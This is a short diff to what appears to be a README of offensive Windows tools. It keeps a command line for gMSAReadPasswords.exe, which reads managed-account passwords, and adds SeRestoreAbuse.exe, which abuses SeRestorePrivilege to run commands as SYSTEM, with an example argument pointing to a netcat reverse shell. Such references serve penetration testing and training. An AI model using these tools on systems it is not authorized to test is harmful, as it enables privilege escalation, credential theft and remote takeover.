@@ -15,3 +15,12 @@
 
 ```bash
 gMSAReadPasswords.exe --accountname "account_name"
+
+## SeRestoreAbuse
+
+### Description
+
+**SeRestoreAbuse** Executes a command as SYSTEM when SeRestorePrivilege is assigned. In case it's disabled, the program will enable it for you.
+
+```bash
+SeRestoreAbuse.exe "reverse shell using netcat / Commands of your choice"
